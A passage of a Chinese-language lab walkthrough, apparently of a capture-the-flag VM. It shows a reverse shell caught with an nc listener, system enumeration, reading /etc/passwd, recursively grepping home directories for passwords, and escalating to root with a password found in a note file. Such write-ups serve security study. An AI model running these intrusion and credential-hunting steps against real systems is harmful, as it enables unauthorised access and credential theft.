-   ![image-20230523100341530](https://raw.githubusercontent.com/r0o983/images/main/image-20230523100341530.png)

-   获得初始shell

-   ```shell
    └─$ nc -nvlp 1234                         
    listening on [any] 1234 ...
    connect to [192.168.2.128] from (UNKNOWN) [192.168.2.134] 55443
    bash: no job control in this shell
    bash-3.2$ whoami
    apache
    bash-3.2$ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:fe:01:38 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.134/24 brd 192.168.2.255 scope global eth1
        inet6 fe80::20c:29ff:fefe:138/64 scope link 
           valid_lft forever preferred_lft forever
    bash-3.2$ uname -a
    Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
    bash-3.2$ leb_release -a
    bash: leb_release: command not found
    bash-3.2$ sudo -l
    sudo: sorry, you must have a tty to run sudo
    bash-3.2$ python -c 'import pty;pty.spawn("/bin/bash");'
    bash-3.2$ sudo -l
    sudo -l
    Password:
    
    bash-3.2$ 
    
    ```

### 尝试提权

-   在目标机中发现众多账号，尝试寻找包含密码文件

-   ```shell
    cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    news:x:9:13:news:/etc/news:
    uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:99:99:Nobody:/:/sbin/nologin
    vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
    rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
    nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
    tcpdump:x:72:72::/:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin
    polkituser:x:87:87:PolicyKit:/:/sbin/nologin
    avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
    mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
    smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
    apache:x:48:48:Apache:/var/www:/sbin/nologin
    ntp:x:38:38::/etc/ntp:/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin
    rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
    nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
    torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin
    haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
    gdm:x:42:42::/var/gdm:/sbin/nologin
    patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash
    jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash
    andy:x:502:502:Andrew Carp:/home/andy:/bin/bash
    loren:x:503:503:Loren Felt:/home/loren:/bin/bash
    amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash
    mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
    cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
    bash-3.2$ cat /etc/shadow
    cat /etc/shadow
    cat: /etc/shadow: Permission denied
    bash-3.2$ 
    
    ```

-   查找密码文件

-   >   bash-3.2$ grep -R -i password /home/* 2>/dev/null
    >
    >   参数解释：
    >
    >   -R 递归查找
    >
    >   -i 不区分大小写
    >
    >   2>/dev/null  将错误信息全部丢弃

-   ![image-20230523101141435](https://raw.githubusercontent.com/r0o983/images/main/image-20230523101141435.png)

-   获得密码，尝试提权

-   ```shell
    bash-3.2$ cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:
    cat: /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:: No such file or directory
    bash-3.2$ cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note
    <?xml version="1.0" encoding="utf-8"?>
    <note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
      <title>Root password</title>
      <text xml:space="preserve"><note-content version="0.1">Root password
    
    Root password
    
    50$cent</note-content></text>
      <last-change-date>2012-12-05T07:24:52.7364970-05:00</last-change-date>
      <create-date>2012-12-05T07:24:34.3731780-05:00</create-date>
      <cursor-position>15</cursor-position>
      <width>450</width>
      <height>360</height>
      <x>0</x>
      <y>0</y>
      <open-on-startup>False</open-on-startup>
    </note>bash-3.2$ 
    
    ```

-   提权成功

-   ```shell
    [root@localhost public_html]# whoami
    whoami
    root
    [root@localhost public_html]# ip a
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:fe:01:38 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.134/24 brd 192.168.2.255 scope global eth1
        inet6 fe80::20c:29ff:fefe:138/64 scope link 
           valid_lft forever preferred_lft forever
    [root@localhost public_html]# sudo -l
    sudo -l
    User root may run the following commands on this host:
        (ALL) ALL
    [root@localhost public_html]# uname -a
    uname -a
    Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
    [root@localhost public_html]# lsb_release -a
    lsb_release -a
    bash: lsb_release: command not found
    [root@localhost public_html]# 
    
    ```

-   
